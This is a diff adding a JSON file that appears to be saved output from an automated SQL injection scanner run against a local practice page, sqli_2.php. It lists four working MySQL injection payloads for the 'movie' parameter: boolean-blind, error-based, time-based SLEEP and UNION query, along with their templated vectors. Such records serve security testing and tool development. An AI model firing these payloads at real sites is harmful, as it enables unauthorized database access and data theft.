@@ -1,0 +1,108 @@
+[
+	{
+		"data": [
+			{
+				"status": 1,
+				"type": 0,
+				"value": {
+					"data": null,
+					"query": "movie=1&action=go",
+					"url": "http://localhost:8080/sqli_2.php"
+				}
+			},
+			{
+				"status": 1,
+				"type": 1,
+				"value": [
+					{
+						"clause": [
+							1,
+							8,
+							9
+						],
+						"conf": {
+							"code": null,
+							"notString": null,
+							"optimize": null,
+							"regexp": null,
+							"string": "Cobra Commander",
+							"textOnly": null,
+							"titles": null
+						},
+						"data": {
+							"1": {
+								"comment": "",
+								"falseCode": 200,
+								"matchRatio": null,
+								"payload": "movie=1 AND 1943=1943&action=go",
+								"templatePayload": null,
+								"title": "AND boolean-based blind - WHERE or HAVING clause",
+								"trueCode": 200,
+								"vector": "AND [INFERENCE]",
+								"where": 1
+							},
+							"2": {
+								"comment": "",
+								"falseCode": null,
+								"matchRatio": null,
+								"payload": "movie=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a626271,(SELECT (ELT(9513=9513,1))),0x717a707871,0x78))s), 8446744073709551610, 8446744073709551610)))&action=go",
+								"templatePayload": null,
+								"title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)",
+								"trueCode": null,
+								"vector": "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))",
+								"where": 1
+							},
+							"5": {
+								"comment": "",
+								"falseCode": null,
+								"matchRatio": null,
+								"payload": "movie=1 AND (SELECT 6069 FROM (SELECT(SLEEP([SLEEPTIME])))hbiK)&action=go",
+								"templatePayload": null,
+								"title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+								"trueCode": 200,
+								"vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+								"where": 1
+							},
+							"6": {
+								"comment": "[GENERIC_SQL_COMMENT]",
+								"falseCode": null,
+								"matchRatio": null,
+								"payload": "movie=-6111 UNION ALL SELECT NULL,CONCAT(0x717a626271,0x6a6a6b71476642526b45636b68727472467178445873784152516864556b6a6d4374637046624f71,0x717a707871),NULL,NULL,NULL,NULL,NULL-- -&action=go",
+								"templatePayload": null,
+								"title": "Generic UNION query (NULL) - 1 to 20 columns",
+								"trueCode": null,
+								"vector": [
+									1,
+									7,
+									"[GENERIC_SQL_COMMENT]",
+									"",
+									"",
+									"NULL",
+									2,
+									false,
+									null,
+									null,
+									null
+								],
+								"where": 2
+							}
+						},
+						"dbms": "MySQL",
+						"dbms_version": [
+							">= 5.5"
+						],
+						"notes": [],
+						"os": null,
+						"parameter": "movie",
+						"place": "GET",
+						"prefix": "",
+						"ptype": 1,
+						"suffix": ""
+					}
+				]
+			}
+		],
+		"error": [],
+		"success": true
+	}
+]
